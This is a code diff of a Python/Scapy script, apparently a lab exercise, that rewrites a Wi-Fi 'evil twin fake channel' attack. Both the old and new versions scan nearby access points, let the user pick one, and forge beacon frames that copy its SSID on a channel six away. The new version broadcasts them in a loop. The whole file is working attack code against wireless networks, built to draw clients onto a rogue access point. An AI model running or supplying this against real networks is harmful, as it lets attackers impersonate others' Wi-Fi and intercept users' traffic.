@@ -1,107 +1,118 @@
-#!/bin/python3
-import argparse
+import os
+import threading
+import time
+import fcntl
 
 from scapy.all import *
-from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap
-
-# Global variables
-BSSIDs = {}  # dictionary with BSSID as the key
+from tabulate import tabulate
 
 
-def packet_handler(p):
+interface = "wlan0mon"
+unique_networks = {}
+
+def get_mac_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15].encode('utf-8')))
+    return ':'.join('%02x' % b for b in info[18:24])
+
+def channel_hopper():
+    while True:
+        for channel in range(1, 14):  # 2.4 GHz channels (1-13)
+            os.system(f"iw dev {interface} set channel {channel}")
+            time.sleep(1)
+
+
+def callback(packet):
+    if packet.haslayer(Dot11Beacon):
+        ssid = packet[Dot11Elt].info.decode()
+        bssid = packet[Dot11].addr3
+        src = packet[Dot11].addr2
+        rssi = packet.dBm_AntSignal
+        channel = int(ord(packet[Dot11Elt:3].info))
+
+        if ssid not in unique_networks:
+            unique_networks[ssid] = {bssid: {"channels": [channel], "rssi": rssi}}
+        else:
+            if bssid not in unique_networks[ssid]:
+                unique_networks[ssid][bssid] = {"channels": [channel], "rssi": rssi}
+            else:
+                if channel not in unique_networks[ssid][bssid]["channels"]:
+                    unique_networks[ssid][bssid]["channels"].append(channel)
+
+
+def forge_and_send_packet(ssid, bssid):
     """
-    Packet handler to analyse Beacon frames and discover new AP on the network
-    Display each new AP with the BSSID, signal strength, channel and SSID
-    :param p: the packet to analyse
-    """
-    if p.haslayer(Dot11Beacon):
-        # Get mac address of the AP
-        bssid = p.addr2
-        if bssid not in BSSIDs:
-            # Try to get the signal
-            try:
-                signal = p.dBm_antSignal
-            except:
-                signal = "N/A"
-
-            channel = p[Dot11Beacon].network_stats().get("channel")
-
-            ssid = p.info.decode("utf-8")
-
-            # Store and display the new BSSID
-            BSSIDs[bssid] = (signal, channel, ssid)
-            print("{} {:^17} {:^9} {}".format(bssid, signal, channel if channel is not None else "None", ssid))
-
-
-def search_ap():
-    """
-    Sniff for Ap's in the proximity
-    :return:
-    """
-    print("{:<16} {} {:<2} {:<32}".format("<MAC>", "<signal strength>","<channel>","<SSID>"))
-    sniff(iface=args.Interface, prn=packet_handler, timeout=args.Timeout)
-
-
-def select_ap():
-    """
-    Ask user to choose a BSSID
-    :return: the selected BSSID
-    """
-    userBssid = input("Please select the BSSID:\n")
-    print("You selected the BSSID:", userBssid)
-    return userBssid
-
-
-def forge_packet(bssid):
-    """
-    Forge a Beacon frame based on the user selected BSSID
+    Forge a Beacon frame based on the user-selected BSSID and send it on a different channel
+    6 channels away from the original network.
+    :param ssid: the SSID of the packet to forge
     :param bssid: the BSSID of the packet to forge
-    :return: the forged packet
     """
-    _, channel, ssid = BSSIDs[bssid]
+    original_channel = unique_networks[ssid][bssid]["channels"][0]
+    new_channel = original_channel + 6 if original_channel <= 7 else original_channel - 6
+    new_channel = max(1, min(new_channel, 13))
+    
+    my_mac = get_mac_address(interface)
 
-    channel = channel + 6 if channel <= 6 else channel - 6
+    # Forge the Beacon packet
+    pkt = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=my_mac, addr3=my_mac) / Dot11Beacon(cap="ESS+privacy") / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) / Dot11Elt(ID="DSset", info=chr(new_channel))
 
-    # forge beacon packet
-    packet = RadioTap() \
-             / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=args.BSSID, addr3=args.BSSID) \
-             / Dot11Beacon(cap="ESS+privacy") \
-             / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) \
-             / Dot11Elt(ID="DSset", info=chr(channel))
-
-    # show the forged packet
-    print("forged packet:")
-    packet.show()
-    return packet
+    # Send the forged packet on the new channel
+    sendp(pkt, iface=interface, inter=0.1, loop=1, verbose=1)
 
 
-def evil_twin_fake_channel():
-    """
-    Perform the evil twin fake channel attack
-    :return:
-    """
-    search_ap()
-    selected_bssid = select_ap()
-    forged_beacon = forge_packet(selected_bssid)
-    sendp(forged_beacon, iface=args.Interface, count=args.Packets)
 
+def main():
+    headers = ["Index", "SSID", "BSSID", "Channels", "Signal Strength (dBm)"]
 
-# Args parsing
-parser = argparse.ArgumentParser(prog="Scapy Fake channel Evil Tween attack",
-                                 usage="evil_twin_fake_channel.py -i wlp2s0mon -b 00:11:22:33:44:55 [-t 5 -n 10]",
-                                 allow_abbrev=False)
+    print("Scanning for nearby SSIDs, BSSIDs, channels, and signal strengths...")
 
-parser.add_argument("-i", "--Interface", required=True,
-                    help="The interface that you want to use, needs to be set to monitor mode")
+    # Start the channel hopper thread
+    hopper_thread = threading.Thread(target=channel_hopper)
+    hopper_thread.daemon = True
+    hopper_thread.start()
 
-parser.add_argument("-b", "--BSSID", required=True,
-                    help="The BSSID of the evil AP for the new network", )
+    try:
+        # Use scapy to sniff packets
+        sniff(iface=interface, prn=callback, timeout=30, store=False)  # Increase timeout to 60 seconds
+    except KeyboardInterrupt:
+        pass
 
-parser.add_argument("-t", "--Timeout", required=False, help="The time in seconds to wait before stopping the sniffing",
-                    default=5)
-parser.add_argument("-n", "--Packets", required=False, help="The number of packets to send", default=10)
+    print("\nScan completed")
 
-args = parser.parse_args()
+    networks = []
+    index = 0
+    for ssid, bssid_data in unique_networks.items():
+        for bssid, data in bssid_data.items():
+            channels = data["channels"]
+            rssi = data["rssi"]
+            index += 1
+            networks.append([index, ssid, bssid, ",".join(str(c) for c in channels), rssi])
 
-# Start the attack
-evil_twin_fake_channel()
+    print(tabulate(networks, headers=headers))
+
+    if networks:
+        while True:
+            selection = input("Enter the index of the network you want to select (q to quit): ")
+            if selection.lower() == "q":
+                break
+            try:
+                index = int(selection)
+                if index < 1 or index > len(networks):
+                    print("Invalid selection")
+                else:
+                    selected_network = networks[index-1]
+                    ssid = selected_network[1]
+                    bssid = selected_network[2]
+                    channels = selected_network[3].split(",")
+                    rssi = selected_network[4]
+                    print(f"Selected network: {ssid} ({bssid})")
+                    print(f"Channels: {', '.join(channels)}")
+                    print(f"Signal Strength: {rssi} dBm")
+                    forge_and_send_packet(ssid, bssid)
+                    break
+            except ValueError:
+                print("Invalid selection")
+                continue
+
+if __name__ == "__main__":
+    main()
